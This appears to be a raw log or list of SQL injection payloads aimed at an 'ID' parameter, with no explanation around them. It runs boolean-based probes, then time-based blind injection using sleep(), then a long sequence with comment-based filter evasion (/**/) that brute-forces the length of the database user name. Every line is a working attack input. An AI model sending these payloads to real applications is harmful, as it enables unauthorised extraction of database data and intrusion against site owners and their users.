ID:1
ID:1' and select 1-- 
ID:1' and 1=1-- 
ID:1' and 1=2-- 
ID:1' and 1=1-- 
ID:1' and 1=1-- 
ID:1' and 1=2-- 
ID:1' and 1=2-- 
ID:1' and IF(1=1,sleep(5),2)-- 
ID:1' and IF(1=2,sleep(5),2)-- 
ID:1'/**/and/**/if(length(user())=1,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=1,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=1,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=1,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=1,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())!=1,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=1,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=1,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=2,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=3,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=4,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=5,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=6,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=7,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=8,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=9,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=10,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=11,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=12,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=13,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=14,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=1,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=2,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=3,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=4,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=5,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=6,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=7,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=8,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=9,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=10,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=11,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=12,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=13,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=14,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=1,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=2,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=3,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=4,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=5,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=6,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=7,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=8,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=9,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=10,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=11,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=12,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=13,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=14,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=15,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=16,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=17,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=18,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=19,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=20,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=21,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=22,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=23,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=24,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=25,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=26,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=27,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=28,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=29,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=30,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=31,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=32,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=33,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=34,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=35,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=36,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=37,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=38,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=39,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=40,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=41,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=42,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=43,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=44,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=45,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=46,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=47,sleep(3),1)-- 
